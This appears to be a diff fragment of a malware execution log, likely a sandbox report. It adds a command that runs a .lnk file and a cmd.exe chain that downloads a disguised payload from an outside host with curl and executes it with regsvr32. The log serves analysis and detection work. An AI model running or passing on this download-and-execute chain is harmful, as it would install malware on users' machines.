@@ -20,7 +20,9 @@ cmd.exe /q /c echo 'v7HL' && echo "CX" && MD "%HOMEPATH%\kbp7\ur" && curl.exe --
 
 Exec >>
 
+cmd /c C:\Users\Admin\AppData\Local\Temp\quideleniti.lnk
 
+"C:\Windows\System32\cmd.exe" /q /c echo 'v7HL' && echo "CX" && MD "\Users\Admin\kbp7\ur" && curl.exe --output \Users\Admin\kbp7\ur\CRS2qKz.an.s03 https://bottlenuts.com/6wErmG/D.png && ping VS.org && regsvr32 "\Users\Admin\kbp7\ur\CRS2qKz.an.s03"
 
 *************************************************
 
